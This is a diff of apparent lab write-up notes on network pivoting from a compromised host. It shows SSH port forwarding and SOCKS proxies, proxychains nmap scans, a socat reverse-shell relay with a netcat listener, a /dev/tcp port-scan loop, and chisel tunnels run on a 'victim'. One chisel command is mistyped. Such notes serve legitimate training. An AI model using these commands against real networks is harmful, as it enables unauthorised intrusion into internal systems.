@@ -150,7 +150,11 @@ for i in {21 80 111 135 139 445 443 8080 3389}; do (echo > /dev/tcp/10.200.87.20
 ```
 {% endcode %}
 
-### <mark style="color:green;">1 - Proxychains & Foxyproxy</mark>
+I used a static nmap binary file and scan the internal networks from the victim 10.200.87.200 and found 3 other hosts.
+
+<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption><p>pivot enumeration.</p></figcaption></figure>
+
+### <mark style="color:red;">Proxychains & Foxyproxy</mark>
 
 When creating a proxy we open up a port on our own attacking machine which is linked to the compromised server, giving us access to the target network.
 
@@ -190,35 +194,93 @@ Once activated, all of your browser traffic will be redirected through the chose
 
 With the proxy activated, you can simply navigate to the target domain or IP in your browser and the proxy will take care of the rest!
 
-### <mark style="color:red;">2 - SSH Tunneling & Port Forwarding</mark>
+### <mark style="color:red;">1 - SSH Tunneling & Port Forwarding</mark>
 
 The first tool we'll be looking at is none other than the bog-standard SSH client with an OpenSSH server. Using these simple tools, it's possible to create both forward and reverse connections to make SSH "tunnels", allowing us to forward ports, and/or create proxies.
 
 #### <mark style="color:green;">Forward Connections</mark>
 
-Creating a forward (or "local") SSH tunnel can be done from our attacking box when we have SSH access to the target. As such, this technique is much more commonly used against Unix hosts. Linux servers, in particular, commonly have SSH active and open. That said, Microsoft (relatively) recently brought out their own implementation of the OpenSSH server, native to Windows, so this technique may begin to get more popular in this regard if the feature were to gain more traction.
+There are two ways to create a forward SSH tunnel using the SSH client --> **port forwarding**, and **creating a proxy**.
 
-There are two ways to create a forward SSH tunnel using the SSH client -- **port forwarding**, and **creating a proxy**.
+* **Port forwarding** is accomplished with the `-L` switch, which creates a link to a Local port. For example, if we had SSH access to `10.200.87.200` and there's a webserver running on `10.200.87.150`, we could use this command to create a link to the server on  `10.200.87.150`:\
+  `ssh -L 9051:10.200.87.150:80 root@10.200.87.200 -fN`\
+  &#x20;The `-fN` combined switch does two things: `-f` backgrounds the shell immediately so that we have our own terminal back. `-N` tells SSH that it doesn't need to execute any commands -- only set up the connection.
 
+<figure><img src=".gitbook/assets/image.png" alt=""><figcaption><p>Access webpage hosted on port 80 10.200.87.150, from our kali localhost:9051</p></figcaption></figure>
 
+* **Proxies (forward proxy)** are made using the `-D` switch, for example: `-D 1337`. This will open up port 1337 on your attacking box as a proxy to send data through into the protected network. This is useful when combined with a tool such as proxychains. An example of this command would be:\
+  `ssh -D 1337 root@10.200.87.150 -fN`
 
+<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption><p>Proxy connection to 10.200.87.150</p></figcaption></figure>
 
+Now we can even scan entire 65535 port:
 
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+proxychains4 nmap -sV -p- 10.200.87.150 -T4 --min-rate 20000 --open -vv
+```
+{% endcode %}
 
+### <mark style="color:red;">2 - Socat</mark>
 
+#### Reverse Shell Relay
 
+The relay connects back to a listener started using an alias to a standard netcat listener:  `rlwrap nc -lvnp 4444`.
 
+In this way we can set up a relay to send reverse shells through a compromised system, back to our own attacking machine. This technique can also be chained quite easily; however, in many cases it may be easier to just upload a static copy of netcat to receive your reverse shell directly on the compromised server.
 
+<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption><p>Socat Reverse Shell Relay</p></figcaption></figure>
 
+### <mark style="color:red;">3 - Chisel</mark>
 
+[Chisel](https://github.com/jpillora/chisel) is an awesome tool which can be used to quickly and easily set up a tunnelled proxy or port forward through a compromised system, regardless of whether you have SSH access or not.
 
+Download the Binaries --> [here](https://github.com/jpillora/chisel/releases)
 
+Video Tutorial --> [here](https://www.youtube.com/watch?v=dIqoULXmhXg\&t=124s)
 
+#### _Reverse SOCKS Proxy_
 
+This connects _back_ from a compromised server to a listener waiting on our attacking machine.
 
+`./chisel server -p 1081 --reverse` - on kali.
 
+`./chisel server client $kaliIP:1081 R:socks` - on victim.
 
+<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption><p>Reverse Socks Proxy</p></figcaption></figure>
 
+<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption><p>Accessing 10.200.87.150:80</p></figcaption></figure>
+
+My bad: its actually 127.0.0.1:8080 to access the webserver.
+
+<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
+#### Forward Socks Proxy
+
+Forward proxies are rarer than reverse proxies for the same reason as reverse shells are more common than bind shells; generally speaking, egress firewalls (handling outbound traffic) are less stringent than ingress firewalls (which handle inbound connections). That said, it's still well worth learning how to set up a forward proxy with chisel.
+
+In many ways the syntax for this is simply reversed from a reverse proxy.
+
+First, on the compromised host we would use:\
+`./chisel server -p LISTEN_PORT --socks5`
+
+On our own attacking box we would then use:\
+`./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks`
+
+#### _Local Port Forward_
+
+As with SSH, a local port forward is where we connect from our own attacking machine to a chisel server listening on a compromised target.
+
+On the compromised target we set up a chisel server:\
+`./chisel server -p LISTEN_PORT`
+
+We now connect to this from our attacking machine like so:\
+`./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT`
+
+For example, to connect to 172.16.0.5:8000 (the compromised host running a chisel server), forwarding our local port 2222 to 172.16.0.10:22 (our intended target), we could use:\
+`./chisel client 172.16.0.5:8000 2222:172.16.0.10:22`
+
+### <mark style="color:red;">4 - SSHuttle</mark>
 
 
 
